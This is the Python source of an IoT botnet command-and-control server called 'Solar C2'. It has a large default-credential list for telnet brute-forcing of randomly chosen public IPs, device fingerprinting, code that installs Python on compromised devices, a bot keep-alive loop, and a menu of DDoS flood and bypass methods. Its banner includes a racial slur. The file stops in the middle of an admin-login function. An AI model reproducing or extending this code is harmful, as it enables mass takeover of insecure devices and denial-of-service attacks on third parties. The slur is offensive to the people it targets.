#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Solar C2 - Standalone IoT Botnet C2
"""
import socket
import threading
import time
import random
import json
import base64
import os
import sys
import struct
import subprocess
import urllib.request
import ssl
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import socks
    _SOCKS_AVAILABLE = True
except ImportError:
    _SOCKS_AVAILABLE = False

try:
    from colorama import init, Fore, Style
    init()
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = RESET = MAGENTA = BLUE = WHITE = ''
        LIGHTBLACK_EX = LIGHTWHITE_EX = ''
    class Style:
        RESET_ALL = ''
    init = lambda: None

# ANSI color helpers
def c(name):
    colors = {
        'RED': '\033[91m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'BLUE': '\033[94m',
        'MAGENTA': '\033[95m',
        'CYAN': '\033[36m',
        'WHITE': '\033[97m',
        'LIGHTBLACK_EX': '\033[90m',
        'LIGHTWHITE_EX': '\033[97m',
        'LIGHTRED_EX': '\033[91m',
        'LIGHTGREEN_EX': '\033[92m',
        'LIGHTYELLOW_EX': '\033[93m',
        'LIGHTBLUE_EX': '\033[94m',
        'LIGHTCYAN_EX': '\033[96m',
        'LIGHTMAGENTA_EX': '\033[95m',
    }
    return colors.get(name, '')

gray = c('LIGHTBLACK_EX')
lightwhite = c('LIGHTWHITE_EX')
yellow = c('YELLOW')
RED = c('RED')
GREEN = c('GREEN')
LIGHT_RED = c('LIGHTRED_EX')
WHITE = c('WHITE')
RESET = '\033[0m'

BANNER = f"""{gray}
\x1b[1;32m ▐▄▄▄      ▄ •▄ ▄▄▄ .▄▄▄  
\x1b[1;35m  ·██▪     █▌▄▌▪▀▄.▀·▀▄ █·
\x1b[1;32m▪▄ ██ ▄█▀▄ ▐▀▀▄·▐▀▀▪▄▐▀▀▄   \x1b[1;35m(BOTNET)\x1b[0m
\x1b[1;35m▐█▄▪▐█▐█▌.▐▌▐█ •█▌▐█.█▌ ▐█•█▌
\x1b[1;32m ▀▀▀▀  ▀█▄▀▪·▀  ▀ ▀▀▀ .▀  ▀
\x1b[0m
\x1b[90m                                  We are all clowns\x1b[0m

"""

ansi_clear = '\033[2J\033[H'

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
bots = {}
user_name = ""
active_attacks = {}
active_scans = {}
_agent_c2 = None
scan_stats = {'found': 0, 'deployed': 0}
scan_stats_lock = threading.Lock()

_config_path = os.path.join(SCRIPT_DIR, 'src', 'config.json')
try:
    with open(_config_path, 'r') as f:
        config = json.load(f)
except Exception:
    config = {
        "listen_host": "0.0.0.0",
        "listen_port": 6667,
        "public_host": "0.0.0.0",
        "public_port": 9001,
        "agent_c2_port": 9001,
    }

config.setdefault("listen_host", "0.0.0.0")
config.setdefault("listen_port", 6667)
config.setdefault("public_host", "0.0.0.0")
config.setdefault("public_port", 9001)
config.setdefault("agent_c2_port", 9001)
config.setdefault("scan_listen_port", 9002)
config.setdefault("callback_port", 9001)

AGENT_C2_PORT = config.get("agent_c2_port", 9001)

# IoT constants
IOT_DEFAULT_CREDS = [
    ("root", "root"), ("root", "admin"), ("root", "123456"), ("root", "password"),
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("admin", "admin123"),
    ("root", "xc3511"), ("root", "vizvx"), ("root", "888888"), ("root", "xmhdipc"),
    ("root", "default"), ("root", "juantech"), ("root", "12345"), ("root", "54321"),
    ("support", "support"), ("root", ""), ("admin", ""), ("user", "user"), ("root", "pass"),
    ("admin", "1234"), ("root", "1234"), ("ubnt", "ubnt"), ("root", "open23"),
    ("root", "1234567890"), ("root", "tl7777"), ("root", "123654"), ("root", "pass1234"),
    ("telecom", "telecom"), ("hi3518", "hi3518"), ("bin", "bin"), ("root", "cat1024"),
    ("default", "default"), ("guest", "guest"), ("root", "tautech"),
    ("root", "12345678"), ("root", "123456789"), ("root", "1234567890"),
    ("admin", "password123"), ("admin", "12345678"), ("admin", "1234567890"),
    ("root", "admin123"), ("root", "root123"), ("root", "pass123"),
    ("user", "password"), ("user", "admin"), ("user", "123456"),
    ("test", "test"), ("test", "password"), ("test", "123456"),
    ("guest", "guest123"), ("guest", "password"), ("guest", "123456"),
    ("tplink", "tplink"), ("tplink", "admin"), ("tplink", "password"),
    ("huawei", "huawei"), ("huawei", "admin"), ("huawei", "password"),
    ("zyxel", "zyxel"), ("zyxel", "admin"), ("zyxel", "password"),
    ("dlink", "dlink"), ("dlink", "admin"), ("dlink", "password"),
    ("netgear", "netgear"), ("netgear", "admin"), ("netgear", "password"),
    ("linksys", "linksys"), ("linksys", "admin"), ("linksys", "password"),
    ("default", "password"), ("default", "admin"), ("default", "123456"),
    ("root", "Zte521"), ("root", "telnet23"), ("root", "root1234"),
    ("root", "1234567890"), ("root", "qwerty"), ("root", "letmein"),
    ("admin", "telnet"), ("admin", "administrator"), ("admin", "default123"),
    ("root", "openwrt"), ("root", "busybox"), ("root", "hi3518"),
    ("root", "supervisor"), ("root", "super"), ("root", "supervisor1"),
    ("root", "v22wat"), ("root", "v202"), ("root", "zte9x"),
    ("root", "CMMC"), ("root", "CTWLAN"), ("root", "8888"),
    ("root", "0000000"), ("root", "00000000"), ("root", "111111"),
    ("admin", "admin1"), ("admin", "admin1234"), ("admin", "12345678"),
    ("root", "superman"), ("root", "batman"), ("root", "trustno1"),
    ("root", "hunter2"), ("root", "dragon"), ("root", "master"),
    ("root", "login"), ("root", "welcome"), ("root", "shadow"),
    ("root", "access"), ("root", "hello"), ("root", "charlie"),
    ("root", "abc123"), ("root", "test123"), ("root", "pass12345"),
    ("admin", "administrator1"), ("admin", "password12"), ("admin", "password1234"),
]

IOT_BLACKLIST_SUBNETS = [
    "0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8", "169.254.0.0/16",
    "172.16.0.0/12", "192.0.0.0/24", "192.168.0.0/16", "198.18.0.0/15", "198.51.100.0/24",
    "203.0.113.0/24", "224.0.0.0/4", "240.0.0.0/4", "255.255.255.255/32",
    "3.0.0.0/8", "11.0.0.0/8", "15.0.0.0/8", "16.0.0.0/8", "26.0.0.0/8", "28.0.0.0/8",
    "29.0.0.0/8", "30.0.0.0/8", "33.0.0.0/8", "55.0.0.0/8", "214.0.0.0/8", "215.0.0.0/8",
    "106.184.0.0/14", "150.31.0.0/16", "49.51.0.0/16", "178.62.0.0/16", "160.13.0.0/16",
]

IOT_SUCCESS_FILE = os.path.join(SCRIPT_DIR, 'iot_success.txt')


def _ip_in_blacklist(ip_str):
    try:
        parts = ip_str.split('.')
        if len(parts) != 4:
            return True
        octets = [int(p) for p in parts]
        ip_int = (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]
        for cidr in IOT_BLACKLIST_SUBNETS:
            if '/' in cidr:
                network, prefix = cidr.split('/')
                prefix = int(prefix)
                net_parts = network.split('.')
                net_int = (int(net_parts[0]) << 24) | (int(net_parts[1]) << 16) | (int(net_parts[2]) << 8) | int(net_parts[3])
                mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
                if (ip_int & mask) == (net_int & mask):
                    return True
            else:
                if ip_str == cidr:
                    return True
    except Exception:
        pass
    return False


def _generate_random_public_ip():
    while True:
        ip_int = random.randint(0, 0xFFFFFFFF)
        octet0 = (ip_int >> 24) & 0xFF
        octet1 = (ip_int >> 16) & 0xFF
        octet2 = (ip_int >> 8) & 0xFF
        octet3 = ip_int & 0xFF
        if octet0 == 0 or octet0 == 127 or octet0 >= 224:
            continue
        ip_str = f"{octet0}.{octet1}.{octet2}.{octet3}"
        if not _ip_in_blacklist(ip_str):
            return ip_str


_cached_external_ip = None

def _get_external_ip():
    global _cached_external_ip
    if _cached_external_ip:
        return _cached_external_ip
    try:
        req = urllib.request.Request("https://api.ipify.org", headers={"User-Agent": "SolarC2"})
        with urllib.request.urlopen(req, timeout=3) as response:
            _cached_external_ip = response.read().decode('utf-8').strip()
            return _cached_external_ip
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        _cached_external_ip = local_ip
        return local_ip
    except Exception:
        _cached_external_ip = config.get("public_host", "0.0.0.0")
        return _cached_external_ip


def _try_iot_login(ip, port, username, password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((ip, port))
        banner = b""
        try:
            s.settimeout(1.0)
            banner = s.recv(512)
        except Exception:
            pass
        banner_text = banner.decode('utf-8', errors='ignore').lower()
        if 'login:' not in banner_text and 'username:' not in banner_text and 'user:' not in banner_text:
            s.close()
            return False, banner_text, None
        s.sendall((username + "\r\n").encode('utf-8', errors='ignore'))
        time.sleep(0.2)
        s.sendall((password + "\r\n").encode('utf-8', errors='ignore'))
        time.sleep(0.35)
        response = b""
        try:
            s.settimeout(1.5)
            response = s.recv(1024)
        except Exception:
            pass
        response_text = response.decode('utf-8', errors='ignore').lower()
        failure_signals = ['incorrect', 'failed', 'failure', 'invalid', 'denied', 'wrong']
        if any(signal in response_text for signal in failure_signals):
            s.close()
            return False, response_text, None
        if 'login:' in response_text or 'password:' in response_text:
            s.close()
            return False, response_text, None
        success_signals = ['#', '$', '>', 'busybox', 'shell', 'welcome', '~ #', '/ #']
        if any(signal in response_text for signal in success_signals):
            return True, response_text, s
        if len(response_text.strip()) == 0 and len(banner_text.strip()) > 0:
            return True, banner_text + response_text, s
        s.close()
        return False, response_text, None
    except Exception:
        return False, "", None


def _verify_iot_device(sock):
    try:
        checks = ["busybox\r\n", "uname -a\r\n", "cat /proc/cpuinfo\r\n", "cat /etc/issue\r\n", "ps\r\n"]
        buf = b""
        for cmd in checks:
            try:
                sock.settimeout(1.2)
                sock.sendall(cmd.encode('utf-8', errors='ignore'))
                time.sleep(0.25)
                chunk = sock.recv(4096)
                if chunk:
                    buf += chunk
            except Exception:
                break
        text = buf.decode('utf-8', errors='ignore').lower()
        iot_keywords = ["busybox", "uclinux", "openwrt", "dd-wrt", "camera", "ipcam", "dvr", "nvr", "router", "firmware", "mips", "armv", "aarch64"]
        anti_keywords = ["ubuntu", "debian", "centos", "windows", "microsoft"]
        for kw in iot_keywords:
            if kw in text:
                return True
        anti_hits = sum(1 for kw in anti_keywords if kw in text)
        if anti_hits >= 2:
            return False
        return True
    except Exception:
        return False
    finally:
        try:
            sock.settimeout(0.5)
        except Exception:
            pass


def _detect_architecture(sock):
    probes = ["cat /proc/cpuinfo\n", "uname -m\n", "arch\n"]
    for cmd in probes:
        try:
            sock.sendall(cmd.encode('utf-8', errors='ignore'))
            time.sleep(0.4)
            resp = sock.recv(4096).decode('utf-8', errors='ignore').lower()
            if 'mips' in resp:
                return 'mips'
            if 'arm' in resp:
                return 'arm'
            if 'x86_64' in resp or 'i386' in resp or 'i686' in resp or 'x86' in resp:
                return 'x86'
            if 'ppc' in resp or 'powerpc' in resp:
                return 'powerpc'
        except Exception:
            continue
    return 'unknown'


def _install_python_on_device(sock, arch=None):
    try:
        check_cmd = "which python3 2>/dev/null; python3 --version 2>/dev/null; echo END\n"
        sock.sendall(check_cmd.encode('utf-8', errors='ignore'))
        time.sleep(0.8)
        sock.settimeout(2)
        resp = sock.recv(4096).decode('utf-8', errors='ignore').strip()
        if 'python3' in resp.lower() and '3.' in resp:
            return 'python3'
    except Exception:
        pass
    install_attempts = [
        ("opkg", "opkg update >/dev/null 2>&1 && opkg install python3-light >/dev/null 2>&1 && echo PY_OK || echo PY_FAIL\n"),
        ("apk", "apk add --no-cache python3 >/dev/null 2>&1 && echo PY_OK || echo PY_FAIL\n"),
        ("apt", "apt-get update >/dev/null 2>&1 && apt-get install -y python3-minimal >/dev/null 2>&1 && echo PY_OK || echo PY_FAIL\n"),
    ]
    for _name, cmd in install_attempts:
        try:
            sock.sendall(cmd.encode('utf-8', errors='ignore'))
            time.sleep(3)
            sock.settimeout(3)
            resp = sock.recv(4096).decode('utf-8', errors='ignore').strip()
            if 'PY_OK' in resp:
                return 'python3'
        except Exception:
            pass
    return None


def _save_iot_success(ip, port, username="unknown", password="unknown"):
    try:
        with open(IOT_SUCCESS_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{ip}:{port}:{username}:{password}\n")
    except Exception:
        pass


def _load_iot_successes():
    successes = []
    try:
        if os.path.exists(IOT_SUCCESS_FILE):
            with open(IOT_SUCCESS_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        successes.append(line)
    except Exception:
        pass
    return successes


def _rewrite_iot_save_file(entries):
    try:
        with open(IOT_SUCCESS_FILE, 'w', encoding='utf-8') as f:
            for entry in entries:
                f.write(f"{entry}\n")
    except Exception:
        pass


def _load_proxy_list():
    proxies = []
    proxy_file = os.path.join(SCRIPT_DIR, 'core', 'free-proxy-list.txt')
    try:
        if os.path.exists(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#") or line.startswith("*"):
                        continue
                    parts = line.split(":")
                    if len(parts) >= 2:
                        try:
                            int(parts[-1])
                            proxies.append(line)
                        except ValueError:
                            pass
    except Exception:
        pass
    return proxies


def _try_iot_login_with_proxy(ip, port, username, password, proxy_url=None):
    try:
        if proxy_url and _SOCKS_AVAILABLE:
            host, pport = proxy_url.rsplit(":", 1)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.setproxy(socks.PROXY_TYPE_SOCKS4, host, int(pport))
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((ip, port))
        banner = b""
        try:
            s.settimeout(1.0)
            banner = s.recv(512)
        except Exception:
            pass
        banner_text = banner.decode('utf-8', errors='ignore').lower()
        if 'login:' not in banner_text and 'username:' not in banner_text and 'user:' not in banner_text:
            s.close()
            return False, banner_text, None
        s.sendall((username + "\r\n").encode('utf-8', errors='ignore'))
        time.sleep(0.2)
        s.sendall((password + "\r\n").encode('utf-8', errors='ignore'))
        time.sleep(0.35)
        response = b""
        try:
            s.settimeout(1.5)
            response = s.recv(1024)
        except Exception:
            pass
        response_text = response.decode('utf-8', errors='ignore').lower()
        failure_signals = ['incorrect', 'failed', 'failure', 'invalid', 'denied', 'wrong']
        if any(signal in response_text for signal in failure_signals):
            s.close()
            return False, response_text, None
        success_signals = ['#', '$', '>', 'busybox', 'shell', 'welcome', '~ #', '/ #']
        if any(signal in response_text for signal in success_signals):
            return True, response_text, s
        if len(response_text.strip()) == 0 and len(banner_text.strip()) > 0:
            return True, banner_text + response_text, s
        s.close()
        return False, response_text, None
    except Exception:
        return False, "", None


def _is_port_open(ip, port, timeout=0.8):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except Exception:
        return False


def _flush_input(client, timeout=0.1):
    try:
        client.settimeout(timeout)
        while True:
            data = client.recv(1024)
            if not data:
                break
    except socket.timeout:
        pass
    except Exception:
        pass
    finally:
        client.settimeout(None)


def _send(client, data, escape=True, reset=True):
    try:
        if reset:
            data += Fore.RESET
        if escape:
            data += '\r\n'
        client.sendall(data.encode('utf-8', errors='ignore'))
    except Exception:
        pass


def _disable_echo(client):
    try:
        client.sendall(b"\xFF\xFA\x01\x00\xFF\xF0")
    except Exception:
        pass


def _enable_echo(client):
    try:
        client.sendall(b"\xFF\xFA\x01\x01\xFF\xF0")
    except Exception:
        pass


def _start_go_scanner(go_bin_path, host, port, threads, abort_event, client_ref=None, scan_stats=None, scan_stats_lock=None):
    import subprocess
    try:
        proc = subprocess.Popen(
            [go_bin_path, host, str(port)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
    except Exception:
        return None
    
    def _read_scanner_output():
        try:
            while not abort_event.is_set() and proc.poll() is None:
                line = proc.stdout.readline()
                if not line:
                    break
                text = line.decode('utf-8', errors='ignore').strip()
                if text:
                    try:
                        _send(client_ref, f'{gray}{text}{lightwhite}')
                    except Exception:
                        pass
                    if "HIT" in text or "FOUND" in text or "DEPLOYED" in text or "EXPLOIT" in text:
                        with scan_stats_lock:
                            if "FOUND" in text or "EXPLOIT" in text:
                                scan_stats['found'] += 1
                            if "DEPLOYED" in text:
                                scan_stats['deployed'] += 1
        except Exception:
            pass
    
    threading.Thread(target=_read_scanner_output, daemon=True).start()
    return proc


def _handle_go_scan_result(conn, client_ref=None, scan_stats=None, scan_stats_lock=None):
    try:
        conn.settimeout(5)
        data = conn.recv(4096)
        if not data:
            conn.close()
            return
        conn.close()
    except Exception:
        pass


def find_login(username, password):
    cred_file = os.path.join(SCRIPT_DIR, 'logins', 'credentials.txt')
    if not os.path.exists(cred_file):
        return False
    try:
        with open(cred_file, 'r', encoding='utf-8', errors='ignore') as f:
            credentials = [x.strip() for x in f.readlines() if x.strip()]
        for cred in credentials:
            if ':' in cred:
                c_user, c_pass = cred.split(':', 1)
                if c_user.lower() == username.lower() and c_pass == password:
                    return True
    except Exception:
        pass
    return False


def _ping():
    while True:
        dead_bots = []
        for bot in bots.copy().keys():
            try:
                bot.settimeout(3)
                _send(bot, 'PING', False, False)
                resp = bot.recv(1024)
                if not resp or resp.decode(errors='ignore').strip() != 'PONG':
                    dead_bots.append(bot)
            except Exception:
                dead_bots.append(bot)
        for bot in dead_bots:
            bots.pop(bot, None)
            try:
                bot.close()
            except Exception:
                pass
        time.sleep(5)


def _captcha_generator():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    return a, b, a + b


def _show_banner(client):
    _send(client, ansi_clear, False)
    for line in BANNER.split('\n'):
        _send(client, line)
    _send(client, f"{gray}Type 'HELP' for available commands.{lightwhite}")


def _show_attack_screen(client, attack_info):
    """Display the attack sent screen with interface box and countdown."""
    RED = c('RED')
    LIGHT_RED = c('LIGHTRED_EX')
    GREEN = c('GREEN')
    WHITE = c('WHITE')
    RESET = '\033[0m'
    gray = c('LIGHTBLACK_EX')
    lightwhite = c('LIGHTWHITE_EX')

    box_width = 40
    indent = '    '

    lines = []
    lines.append(f'{indent}{RED}┌{"─"*box_width}┐')
    lines.append(f'{indent}│{gray} Great power comes great responsibility{" "*(box_width-38)}│')
    lines.append(f'{indent}│{gray} - niggaman<3{" "*(box_width-12)}│')
    lines.append(f'{indent}{RED}├{"─"*box_width}┤')
    status = f'{GREEN}ATTACK SENT'
    lines.append(f'{indent}│{RED}  Status: [{status}]{" "*(box_width-16)}│')
    target_ip = attack_info.get("target_ip", "UNKNOWN")
    port_val = str(attack_info.get("target_port", 0))
    dur_val = str(attack_info.get("duration", 0)) + "s"
    method_val = attack_info.get("method", "UNKNOWN")
    lines.append(f'{indent}│ {LIGHT_RED}Target: [{target_ip:<27}]{" "*(box_width-33)}│')
    lines.append(f'{indent}│ {LIGHT_RED}Port:   [{port_val:<27}]{" "*(box_width-33)}│')
    lines.append(f'{indent}│ {LIGHT_RED}Time:   [{dur_val:<27}]{" "*(box_width-33)}│')
    lines.append(f'{indent}│ {LIGHT_RED}Method: [{method_val:<26}]{" "*(box_width-33)}│')

    for line in lines:
        _send(client, f'{line}{lightwhite}')
        _send(client, '\r\n', False, False)
    _send(client, f'{RESET}', False, False)

    end_time = attack_info['end_time']
    thread_ref = attack_info['thread']
    abort_event = attack_info['abort_event']
    lock = attack_info['lock']

    countdown_thread = threading.Thread(
        target=_countdown_display,
        args=(client, end_time, thread_ref, abort_event, lock, attack_info),
        daemon=True
    )
    countdown_thread.start()
    attack_info['countdown_thread'] = countdown_thread
    return countdown_thread


def _countdown_display(client, end_time, thread_ref, abort_event, lock, attack_info):
    """Display countdown timer during attack."""
    RED = c('RED')
    GREEN = c('GREEN')
    RESET = '\033[0m'
    gray = c('LIGHTBLACK_EX')
    lightwhite = c('LIGHTWHITE_EX')

    while not abort_event.is_set() and time.time() < end_time:
        remaining = int(end_time - time.time())
        if remaining < 0:
            remaining = 0
        mins, secs = divmod(remaining, 60)
        time_str = f"{mins:02d}:{secs:02d}"

        with lock:
            sent_count = attack_info.get('sent', 0)

        _send(client, f'\033[2K\r{gray}Time remaining: {GREEN}{time_str}{gray} | Sent: {lightwhite}{sent_count}{gray} | Bots: {lightwhite}{len(bots)}{RESET}', False, False)
        time.sleep(1)

    _send(client, f'\033[2K\r{gray}Time remaining: {RED}00:00{gray} | Sent: {lightwhite}{attack_info.get("sent", 0)}{RESET}\r\n', False)


def _handle_attack_background(client, address, attack_info):
    """Run attack in background and display the attack screen."""
    countdown_thread = _show_attack_screen(client, attack_info)
    abort_event = attack_info['abort_event']
    end_time = attack_info['end_time']

    def _bg_input_watcher():
        while not abort_event.is_set() and time.time() < end_time:
            try:
                client.settimeout(1)
                data = client.recv(1024)
                client.settimeout(None)
                if data:
                    txt = data.decode('cp1252', errors='ignore').strip()
                    if txt == '#':
                        _send(client, '\033[2K\r', False, False)
                        break
            except socket.timeout:
                continue
            except Exception:
                break

    bg_input_thread = threading.Thread(target=_bg_input_watcher, daemon=True)
    bg_input_thread.start()
    _disable_echo(client)

    countdown_thread.join(timeout=attack_info['duration'] + 5)
    _enable_echo(client)
    _send(client, f'\n{gray}Press Enter to return to main menu (attack continues in background).{lightwhite}')

    try:
        data = client.recv(1024)
    except Exception:
        pass

    _send(client, f'\n{gray}Returning to main menu...{lightwhite}')
    _show_main_menu(client)


def _show_main_menu(client):
    """Display the main menu after attack screen."""
    _send(client, ansi_clear, False)
    _show_banner(client)


def command_line(client, address):
    """Main command line interface for authenticated users."""
    global user_name

    _send(client, ansi_clear, False)
    _show_banner(client)

    prompt = f'\x1b[1;32mJoker\x1b[35m~# \x1b[0m'

    while True:
        try:
            _send(client, '\r\033[2K' + prompt, False, False)
            data = client.recv(1024)
            if not data:
                break
            text = data.decode('cp1252', errors='ignore').strip()
            if not text:
                continue
            if text == '#':
                _send(client, ansi_clear, False)
                _show_banner(client)
                continue

            args = text.split()
            command = args[0].upper() if args else ""
            if command.startswith('!'):
                command = command[1:].upper()
            if command in ('HELP', '?'):
                clear_screen = "\033[H\033[J"
                _send(client, clear_screen, False)
                _send(client, '\x1b[1;90m              --> | Help | <--       \r\n', False, False)
                border_top = '╔' + '═' * 38 + '╗'
                border_bot = '╚' + '═' * 38 + '╝'
                _send(client, f'\x1b[1;35m{border_top}\x1b[0m\r\n', False, False)
                commands = [
                    ("propag", "Start bot self-propagation"),
                    ("attack", "Launch DDoS attack"),
                    ("bypass", "Show bypass methods"),
                    ("bots", "Show connected bots"),
                    ("methods", "L4/L7 flood methods"),
                    ("tools", "Tools menu"),
                    ("stop", "Stop all active tasks"),
                    ("banner", "Show banner"),
                    ("status", "Show bot/attack status"),
                    ("credits", "Show credits"),
                    ("clear", "Clear screen"),
                    ("exit", "Disconnect"),
                    ("admin", "Admin menu (req login)"),
                ]
                for cmd, desc in commands:
                    content = f" {cmd:<7} - {desc}"
                    padded = content.ljust(38)
                    _send(client, f'\x1b[1;35m║\x1b[0m\x1b[1;92m{padded}\x1b[0m\x1b[1;35m║\x1b[0m\r\n', False, False)
                _send(client, f'\x1b[1;35m{border_bot}\x1b[0m\r\n', False, False)
                _send(client, '\x1b[1;90m         Type # to return to main menu\x1b[0m\r\n', False, False)
                continue

            if command not in ('HELP', '?'):
                _send(client, ansi_clear, False)

            if command == 'METHODS':
                _send(client, ansi_clear, False)
                _show_methods(client)

            elif command == 'TOOLS':
                _send(client, ansi_clear, False)
                _show_tools(client, address)

            elif command == 'CREDITS':
                _send(client, ansi_clear, False)
                _show_credits(client)

            elif command == 'BOTS':
                _send(client, ansi_clear, False)
                telnet_count = len(bots)
                agent_count = 0
                if _agent_c2:
                    try:
                        agent_list = _agent_c2.get_active_agents()
                        agent_count = len(agent_list)
                    except Exception:
                        pass
                total = telnet_count + agent_count
                _send(client, f'{gray}Connected bots: {lightwhite}{total}{gray} (telnet: {telnet_count} | agents: {agent_count}){lightwhite}')
                for bot, info in bots.items():
                    ip = info[0] if isinstance(info, tuple) else "?"
                    _send(client, f'{gray}  [TELNET] {lightwhite}{ip}{gray}')
                if agent_count > 0:
                    try:
                        agents = _agent_c2.list_agents()
                        for aid, info in agents.items():
                            if info.get("connected"):
                                _send(client, f'{gray}  [AGENT]  {lightwhite}{info.get("ip", "?")}{gray} id={aid} arch={info.get("arch","?")}{gray}')
                    except Exception:
                        pass

            elif command == 'BANNER':
                _send(client, ansi_clear, False)
                _show_banner(client)

            elif command == 'CLEAR' or command == 'CLS':
                _send(client, ansi_clear, False)
                _show_banner(client)

            elif command == 'STATUS':
                _send(client, ansi_clear, False)
                telnet_count = len(bots)
                agent_count = 0
                if _agent_c2:
                    try:
                        agent_count = len(_agent_c2.get_active_agents())
                    except Exception:
                        pass
                _send(client, f'{gray}Active attacks: {lightwhite}{len(active_attacks)}{gray} | Bots: {lightwhite}{telnet_count + agent_count}{gray} (telnet: {telnet_count} | agents: {agent_count}){lightwhite}')
                if not active_attacks:
                    _send(client, f'{yellow}[!] No active attacks.{lightwhite}')
                else:
                    for aid, info in active_attacks.items():
                        remaining = int(info['end_time'] - time.time())
                        _send(client, f'{gray}[{aid}] Target: {lightwhite}{info["target_ip"]}:{info["target_port"]}{gray} | Method: {lightwhite}{info["method"]}{gray} | Time left: {lightwhite}{remaining}s{gray} | Sent: {lightwhite}{info.get("sent", 0)}{gray}')

            elif command == 'STOP':
                _send(client, ansi_clear, False)
                if not active_attacks:
                    _send(client, f'{yellow}[!] No active attacks to stop.{lightwhite}')
                else:
                    for aid, info in list(active_attacks.items()):
                        info['abort_event'].set()
                    active_attacks.clear()
                    _send(client, f'{lightwhite}[+] All active attacks stopped.{lightwhite}')
                if _agent_c2:
                    try:
                        stopped = _agent_c2.broadcast({"type": "command", "id": str(uuid.uuid4())[:8], "command": {"type": "stop"}})
                        if stopped:
                            _send(client, f'{lightwhite}[+] Sent STOP to {len(stopped)} bots.{lightwhite}')
                    except Exception:
                        pass

            elif command == 'BYPASS':
                _send(client, ansi_clear, False)
                _show_bypass(client)

            elif command == 'PROPAGATE' or command == 'PROPAG':
                _handle_propagate_simple(client, address, args)

            elif command == 'ATTACK':
                _handle_attack(client, address, args)

            elif command == 'EXIT' or command == 'QUIT' or command == 'LOGOUT':
                _send(client, f'{gray}Successfully disconnected.{lightwhite}')
                time.sleep(0.3)
                break

            elif command == 'ADMIN':
                _show_admin_menu(client)

            else:
                _send(client, f'{yellow}Unknown command: {text.strip()}. Type help for available commands.{lightwhite}')

        except Exception:
            break
    try:
        client.close()
    except Exception:
        pass


def _show_methods(client):
    """Display the methods screen matching Joker source UI."""
    _send(client, ansi_clear, False)
    _send(client, '\x1b[1;90m                --> | Methods | <--                 \r\n', False, False)
    border_top = '╔' + '═' * 48 + '╗'
    border_bot = '╚' + '═' * 48 + '╝'
    _send(client, f'\x1b[1;35m{border_top}\x1b[0m\r\n', False, False)
    methods = [
        ("UDP", "[IP] [TIME] dport=[PORT]"),
        ("STD", "[IP] [TIME] dport=[PORT]"),
        ("TCP", "[IP] [TIME] dport=[PORT]"),
        ("DNS", "[IP] [TIME] dport=[PORT]"),
        ("VSE", "[IP] [TIME] dport=[PORT]"),
        ("ACK", "[IP] [TIME] dport=[PORT]"),
        ("XMAS", "[IP] [TIME] dport=[PORT]"),
        ("SLOWLORIS", "[IP] [TIME] dport=[PORT]"),
        ("HTTP_GET", "[IP] [TIME] dport=[PORT]"),
        ("HTTPS", "[IP] [TIME] dport=[PORT]"),
        ("CF", "[IP] [TIME] domain=[DOMAIN]"),
        ("NFO", "[IP] [TIME] dport=[PORT]"),
    ]
    for i, (name, params) in enumerate(methods, 1):
        label = f"[{i}]  {name}".ljust(16)
        content = f" {label} {params}"
        padded = content.ljust(48)
        _send(client, f'\x1b[1;35m║\x1b[0m\x1b[1;92m{padded}\x1b[0m\x1b[1;35m║\x1b[0m\r\n', False, False)
    _send(client, f'\x1b[1;35m{border_bot}\x1b[0m\r\n', False, False)
    _send(client, '\r\n', False, False)
    _send(client, f'\n  {gray}Usage: attack <ip> <port> <duration> <method>{lightwhite}')


def _show_bypass(client):
    """Display the bypass screen matching Joker source UI."""
    _send(client, ansi_clear, False)
    _send(client, '\x1b[1;90m          --> | Bypasses | <--        \r\n', False, False)
    _send(client, '\x1b[1;32m╔═══════════════════════════════╗\r\n', False, False)
    _send(client, '\x1b[1;35m║ cf [IP] [T] domain=[DOM]      ║\r\n', False, False)
    _send(client, '\x1b[1;32m║ nfolag [IP] [T] dport=[PORT]  ║\r\n', False, False)
    _send(client, '\x1b[1;35m║ ovhnuke [IP] [T] dport=[PORT] ║\r\n', False, False)
    _send(client, '\x1b[1;32m╠════════════╦═════════════════╣\r\n', False, False)
    _send(client, '\x1b[1;35m║ CF: 80     ║  Version v1      ║\r\n', False, False)
    _send(client, '\x1b[1;32m║ NFO: 22    ║  @iotnet         ║\r\n', False, False)
    _send(client, '\x1b[1;35m║ OVH: 995   ║  @oesuo_         ║\r\n', False, False)
    _send(client, '\x1b[1;32m╠════════════╩═════════════════╣\r\n', False, False)
    _send(client, '\x1b[1;35m║ iplookup - Looks up an IP      ║\r\n', False, False)
    _send(client, '\x1b[1;32m║ portscan - Portscans an IP     ║\r\n', False, False)
    _send(client, '\x1b[1;35m╚═══════════════════════════════╝\r\n', False, False)


def _show_admin_menu(client):
    """Display admin menu after admin authentication."""
    _send(client, ansi_clear, False)
    _flush_input(client)

    _send(client, '\x1b[1;32mUsername\x1b[1;35m: \x1b[0m', False, False)
    try:
        client.settimeout(60)
        data = client.recv(1024)
        if not data:
            return
        admin_user = data.decode('cp1252', errors='ignore').strip()
    except socket.timeout:
        return
    except Exception:
        return
    finally:
        client.settimeout(None)

